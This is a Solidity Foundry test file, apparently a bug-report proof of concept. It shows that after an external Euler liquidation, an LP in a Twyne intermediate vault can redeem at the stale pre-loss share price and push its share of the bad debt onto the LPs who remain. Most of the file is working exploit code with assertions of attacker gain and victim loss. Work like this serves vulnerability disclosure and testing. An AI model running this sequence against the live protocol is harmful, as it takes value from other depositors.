// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {EulerLiquidationTest} from "test/twyne/mainnet/euler/EulerLiquidationTest.t.sol";
import {IEVC} from "ethereum-vault-connector/interfaces/IEthereumVaultConnector.sol";
import {IEVault} from "euler-vault-kit/EVault/IEVault.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Demonstrates a stale-NAV exit window after an external Euler liquidation
/// and before Twyne handles the liquidation and socializes the intermediate-vault bad debt.
/// An intermediate-vault LP can redeem at the pre-loss nominal share price, shifting
/// its pro-rata share of the loss to LPs who remain through socialization.
contract TwyneStaleBadDebtExitPoC is EulerLiquidationTest {
    struct PathResult {
        uint256 attackerValue;
        uint256 victimValue;
        uint256 assetsBeforeSettlement;
        uint256 assetsAfterSettlement;
        uint256 debtBeforeSettlement;
        uint256 debtAfterSettlement;
        uint256 cashAfterSettlement;
    }

    function _prepareWindow() internal {
        test_e_preLiquidationSetup(twyneLiqLTV);

        vm.startPrank(eve);
        IERC20(eulerWETH).approve(address(eeWETH_intermediate_vault), type(uint256).max);
        eeWETH_intermediate_vault.deposit(CREDIT_LP_AMOUNT, eve);
        vm.stopPrank();

        assertGt(eeWETH_intermediate_vault.balanceOf(bob), 0, "bob has no LP shares");
        assertGt(eeWETH_intermediate_vault.balanceOf(eve), 0, "eve has no LP shares");
        assertEq(
            eeWETH_intermediate_vault.balanceOf(bob),
            eeWETH_intermediate_vault.balanceOf(eve),
            "fixture LPs do not have equal shares"
        );

        vm.startPrank(IEVault(eulerUSDC).governorAdmin());
        IEVault(eulerUSDC).setLTV(eulerWETH, 0.5e4, 0.6e4, 0);
        vm.stopPrank();
        vm.warp(block.timestamp + 2);

        assertTrue(alice_collateral_vault.canLiquidate(), "Twyne CV is not liquidatable");

        dealEToken(eulerWETH, liquidator, 100 ether);
        vm.startPrank(liquidator);
        IEVC(IEVault(eulerWETH).EVC()).enableCollateral(liquidator, eulerWETH);
        IEVC(IEVault(eulerUSDC).EVC()).enableController(liquidator, eulerUSDC);

        (uint256 maxRepay,) =
            IEVault(eulerUSDC).checkLiquidation(liquidator, address(alice_collateral_vault), eulerWETH);
        assertGt(maxRepay, 0, "external liquidation has zero repay");
        IEVault(eulerUSDC).liquidate(address(alice_collateral_vault), eulerWETH, maxRepay, 0);
        vm.stopPrank();

        assertTrue(alice_collateral_vault.isExternallyLiquidated(), "external liquidation not detected");
        assertGt(
            eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault)),
            0,
            "no intermediate debt remains"
        );
        assertEq(
            alice_collateral_vault.balanceOf(address(alice_collateral_vault)),
            0,
            "CV collateral should price to zero before handling"
        );

        (uint256 collateralValue, uint256 liabilityValue) =
            eeWETH_intermediate_vault.accountLiquidity(address(alice_collateral_vault), true);
        assertEq(collateralValue, 0, "CV still has priced collateral");
        assertGt(liabilityValue, 0, "CV has no priced liability");
        assertGt(
            eeWETH_intermediate_vault.totalAssets(),
            eeWETH_intermediate_vault.cash(),
            "bad debt not in nominal NAV"
        );
    }

    function _settleBadDebt() internal {
        deal(USDC, liquidator, 1_000_000e6);

        vm.startPrank(liquidator);
        IERC20(USDC).approve(address(alice_collateral_vault), type(uint256).max);
        evc.enableCollateral(liquidator, address(alice_collateral_vault));
        evc.enableController(liquidator, address(eeWETH_intermediate_vault));

        IEVC.BatchItem[] memory items = new IEVC.BatchItem[](2);
        items[0] = IEVC.BatchItem({
            targetContract: address(alice_collateral_vault),
            onBehalfOfAccount: liquidator,
            value: 0,
            data: abi.encodeCall(alice_collateral_vault.handleExternalLiquidation, ())
        });
        items[1] = IEVC.BatchItem({
            targetContract: address(eeWETH_intermediate_vault),
            onBehalfOfAccount: liquidator,
            value: 0,
            data: abi.encodeCall(
                eeWETH_intermediate_vault.liquidate,
                (address(alice_collateral_vault), address(alice_collateral_vault), 0, 0)
            )
        });
        evc.batch(items);
        vm.stopPrank();

        assertEq(
            eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault)),
            0,
            "bad debt was not settled"
        );
    }

    function _redeemAll(address lp) internal returns (uint256 assetsOut) {
        uint256 shares = eeWETH_intermediate_vault.balanceOf(lp);
        assertGt(shares, 0, "LP has no shares");
        vm.prank(lp);
        assetsOut = eeWETH_intermediate_vault.redeem(shares, lp, lp);
    }

    function _previewAll(address lp) internal view returns (uint256 assetsOut) {
        uint256 shares = eeWETH_intermediate_vault.balanceOf(lp);
        assertGt(shares, 0, "LP has no shares");
        assetsOut = eeWETH_intermediate_vault.previewRedeem(shares);
    }

    function _runVulnerablePath() internal returns (PathResult memory r) {
        r.assetsBeforeSettlement = eeWETH_intermediate_vault.totalAssets();
        r.debtBeforeSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));

        // Bob realizes the stale pre-loss NAV while cash is still available.
        r.attackerValue = _redeemAll(bob);

        _settleBadDebt();
        r.assetsAfterSettlement = eeWETH_intermediate_vault.totalAssets();
        r.debtAfterSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
        r.cashAfterSettlement = eeWETH_intermediate_vault.cash();

        // Record Eve's post-loss economic claim instead of forcing a full redemption;
        // EVK may be short by a few wei of immediately available cash due to rounding.
        r.victimValue = _previewAll(eve);
    }

    function _runControlPath() internal returns (PathResult memory r) {
        r.assetsBeforeSettlement = eeWETH_intermediate_vault.totalAssets();
        r.debtBeforeSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));

        // Correct ordering: recognize/socialize the loss before either LP exits.
        _settleBadDebt();
        r.assetsAfterSettlement = eeWETH_intermediate_vault.totalAssets();
        r.debtAfterSettlement = eeWETH_intermediate_vault.debtOf(address(alice_collateral_vault));
        r.cashAfterSettlement = eeWETH_intermediate_vault.cash();

        r.attackerValue = _previewAll(bob);
        r.victimValue = _previewAll(eve);
    }

    function test_PoC_ExternalLiquidationCreatesStaleNavExitWindow() public {
        _prepareWindow();
        uint256 snapshotId = vm.snapshotState();

        PathResult memory vulnerable = _runVulnerablePath();

        assertTrue(vm.revertToState(snapshotId), "snapshot restore failed");
        PathResult memory control = _runControlPath();

        uint256 attackerGain = vulnerable.attackerValue - control.attackerValue;
        uint256 victimExtraLoss = control.victimValue - vulnerable.victimValue;
        uint256 socializedLoss = control.assetsBeforeSettlement - control.assetsAfterSettlement;

        assertGt(attackerGain, 0, "LP exit before socialization produced no gain");
        assertGt(victimExtraLoss, 0, "remaining LP did not absorb extra loss");
        assertApproxEqAbs(attackerGain, victimExtraLoss, 12, "value transfer is not reciprocal");
        assertGt(socializedLoss, 0, "no loss was socialized");
        assertApproxEqAbs(attackerGain * 2, socializedLoss, 16, "equal-share gain is not half the socialized loss");
        assertEq(vulnerable.debtAfterSettlement, 0, "vulnerable path left debt");
        assertEq(control.debtAfterSettlement, 0, "control path left debt");

        console2.log("VULNERABLE attackerValue", vulnerable.attackerValue);
        console2.log("CONTROL attackerValue", control.attackerValue);
        console2.log("attackerGain", attackerGain);
        console2.log("VULNERABLE victimValue", vulnerable.victimValue);
        console2.log("CONTROL victimValue", control.victimValue);
        console2.log("victimExtraLoss", victimExtraLoss);
        console2.log("socializedLoss", socializedLoss);
        console2.log("badDebtBeforeSettlement", control.debtBeforeSettlement);
        console2.log("vulnerableCashAfterSettlement", vulnerable.cashAfterSettlement);
    }
}
